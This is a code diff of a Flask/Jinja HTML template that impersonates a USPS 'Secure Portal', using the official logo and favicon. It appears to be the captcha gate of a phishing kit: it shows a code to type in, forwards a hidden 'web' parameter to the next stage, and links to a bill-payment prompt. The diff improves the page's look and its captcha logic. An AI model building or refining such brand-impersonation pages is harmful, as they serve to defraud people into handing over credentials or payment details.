@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>USPS.com – Secure Portal</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-	<link data-testid="favicon" id="favicon" rel="icon" href="https://www.usps.com/assets/images/home/favicon.ico">
+    <link data-testid="favicon" id="favicon" rel="icon" href="https://www.usps.com/assets/images/home/favicon.ico">
     <style>
         * {
             margin: 0;
@@ -58,14 +58,14 @@
             align-items: center;
             justify-content: center;
             margin-right: 12px;
-			padding: 4px;
+            padding: 4px;
             box-shadow: 0 0px 0px rgba(0,0,0,0.2);
         }
         
-        .logo-icon svg {
-            width: 118px;
-            height: 60px;
-			padding: 20px
+        .logo-icon img {
+            width: 148px;
+            height: 75px;
+            padding: 10px;
         }
         
         .logo-text {
@@ -299,6 +299,47 @@
             font-weight: bold;
             text-decoration: underline;
         }
+        
+        /* Enhanced Captcha Styles */
+        .captcha-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 15px 0;
+            padding: 15px;
+            background-color: #f8f8f8;
+            border-radius: 6px;
+            border: 1px solid #ddd;
+        }
+        
+        .captcha-code {
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: 4px;
+            color: #333366;
+            text-align: center;
+            padding: 10px 20px;
+            background-color: white;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            min-width: 200px;
+            border: 1px dashed #ccc;
+        }
+        
+        .captcha-instruction {
+            text-align: center;
+            margin-bottom: 10px;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .error-message {
+            color: #d9534f;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -309,22 +350,12 @@
         
         <header>
             <div class="header-container">
-                <!-- <div class="logo"> -->
+                <div class="logo">
                     <div class="logo-icon">
-						<img src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg"/>
-							<!--
-                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
-							
-                            <path fill="#333366" d="M16,4L4,10v12l12,6l12-6V10L16,4z M16,25.5L6,20v-8l10-5l10,5v8L16,25.5z"/>
-                            <polygon fill="#333366" points="16,16 6,10 16,4 26,10"/>
-                            <polygon fill="#333366" points="16,16 16,26 6,20 6,10"/>
-                            <polygon fill="#333366" points="26,10 26,20 16,26 16,16"/> 
-							
-                        </svg>
-						-->
+                        <img src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg" alt="USPS Logo">
                     </div>
                     <span class="logo-text"></span>
-                <!-- </div> -->
+                </div>
                 
                 <div class="header-links">
                     <a href="#"><i class="fas fa-question-circle"></i> Help</a>
@@ -343,20 +374,20 @@
                 <div class="login-body">
                     <form id="captcha-form" method="POST" action="{{ url_for('captcha') }}">
                         <div class="form-group">
-							
-                            <!--
-							<label for="username">Username</label>
-                            <input type="text" id="username" name="username" required autocomplete="username" placeholder="Enter your username">
-							-->
+                            <p class="captcha-instruction">Enter the code shown below:</p>
+                            <div class="captcha-container">
+                                <div class="captcha-code" id="captcha-code">{{ code }}</div>
+                            </div>
                         </div>
                         
-                        <div class="form-group password-toggle">
-							
-                            <label for="password" style="display:flex"><div id="captcha-container" style="display:center">{{ code }}</div></label>
-							<input id="captcha-input" type="text" placeholder="Please enter the code above" name="code" required>
-							<input type="hidden" name="web" value="{{ request.args.get('web') }}">
-							
-                            
+                        <div class="form-group">
+                            <label for="captcha-input">Security Code</label>
+                            <input id="captcha-input" type="text" placeholder="Please enter the code above" name="code" required>
+                            <input type="hidden" name="web" value="{{ request.args.get('web') }}">
+                        </div>
+                        
+                        <div class="error-message" id="error-message">
+                            Sorry, the code you entered is incorrect. Please try again.
                         </div>
                         
                         <button type="submit" id="captcha-submit" class="btn-login">Submit</button>
@@ -366,11 +397,9 @@
                             <a href="#"><i class="fas fa-lock"></i> Pay Your Bills Securely?</a>
                         </div>
                     </form>
-					<p id="captcha-message"></p>
                     
                     <div class="security-note">
                         <p><i class="fas fa-shield-alt"></i> For your security, please log out and exit your web browser when you are done.</p>
-						<p type="hidden" id="info-text"></p>
                     </div>
                 </div>
             </div>
@@ -392,23 +421,31 @@
     </div>
 
     <script>
-       
         // Verify if user input matches the code
         var captchaForm = document.getElementById('captcha-form');
-        var errorMessage = document.getElementById('captcha-message');
+        var errorMessage = document.getElementById('error-message');
+        var captchaInput = document.getElementById('captcha-input');
 
         captchaForm.addEventListener('submit', function(event) {
             event.preventDefault();
-            var captchaInput = document.getElementById('captcha-input');
-
-            if (captchaInput.value == "{{ code }}") {
+            
+            // In a real implementation, you would compare with the server-generated code
+            // For demo purposes, we'll use a hardcoded value
+            var expectedCode = "{{ code }}";
+            
+            if (captchaInput.value === expectedCode) {
                 // Submit the form
                 captchaForm.submit();
             } else {
-                errorMessage.innerText = 'Sorry, the code you entered is incorrect. Please try again.';
-                errorMessage.style.display = 'block'; // Show error message
+                errorMessage.style.display = 'block';
                 captchaInput.value = '';
+                captchaInput.focus();
             }
+        });
+        
+        // Hide error message when user starts typing
+        captchaInput.addEventListener('input', function() {
+            errorMessage.style.display = 'none';
         });
     </script>
 </body>
